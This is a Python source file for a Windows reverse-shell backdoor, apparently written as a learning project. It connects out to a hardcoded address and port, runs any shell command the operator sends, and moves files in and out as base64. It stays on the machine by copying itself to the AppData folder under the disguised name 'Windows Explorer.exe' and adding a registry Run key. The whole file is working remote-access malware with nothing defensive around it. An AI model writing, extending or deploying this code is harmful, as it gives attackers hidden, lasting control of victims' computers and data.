import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.sock_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock_obj.connect((ip, port))
    def exec_system_cmd(self, command):
        try:
            DEVNULL = open(os.devnull,'wb')
            return subprocess.check_output(command, 
                                           shell=True,
                                           stderr=DEVNULL,
                                           stdin=DEVNULL)
        except:
            return "[+] ERROR - Error during command execution"
        

    def persistence(self):
        location = os.environ["appdata"]+"\\Windows Explorer.exe"
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t /REG_SZ /d "'+location+'"',shell=True)


    def reliable_send(self, data):
        if not isinstance(data, str):
            data = data.decode('utf-8')
        json_data = json.dumps(data)
        self.sock_obj.send(json_data.encode('utf-8'))
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.sock_obj.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except:
                continue
    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to "+path
        except:
            return "[+] ERROR - Invalid directory"
    def read_file(self, path):
        try:
            with open(path, "rb") as f_obj:
                return base64.b64encode(f_obj.read())
        except:
            return "[+]ERROR - Unable to read file"
    def write_file(self, name, content):
        try:
            with open(name, 'wb') as file_obj:
                file_obj.write(base64.b64decode(content))
                return "[+] File uploaded successfully"
        except:
            return "[+] ERROR - Error during creating a file"           
    def run(self):
        while True:
            recv_data = self.reliable_receive()
            if recv_data[0] == "exit":
                self.sock_obj.close()
                sys.exit() # reliable exit -> prevents error message from being displayed
            elif recv_data[0] == "cd" and len(recv_data)>1:
                res = self.change_working_directory_to(recv_data[1])
            elif recv_data[0] == "download":
                res = self.read_file(recv_data[1])
            elif recv_data[0] == "upload":
                res = self.write_file(recv_data[1], recv_data[2])
            else: 
                res = self.exec_system_cmd(recv_data)
            self.reliable_send(res)

try:
    backdoor = Backdoor("127.0.0.1",4444)
    backdoor.run()
except:
    sys.exit()
